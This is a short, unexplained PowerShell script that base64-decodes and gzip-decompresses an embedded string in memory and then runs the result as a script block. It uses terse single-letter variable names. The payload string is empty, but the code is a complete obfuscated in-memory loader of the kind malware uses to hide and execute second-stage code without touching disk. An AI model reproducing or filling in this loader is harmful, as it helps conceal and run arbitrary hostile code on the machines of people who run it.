$z=''
$y=[Convert]::FromBase64String($z)
$w=New-Object IO.MemoryStream(,$y)
$v=New-Object IO.Compression.GzipStream($w,[IO.Compression.CompressionMode]::Decompress)
$u=New-Object IO.MemoryStream
$v.CopyTo($u);$v.Dispose()
$t=[Text.Encoding]::UTF8.GetString($u.ToArray())
& ([ScriptBlock]::Create($t))
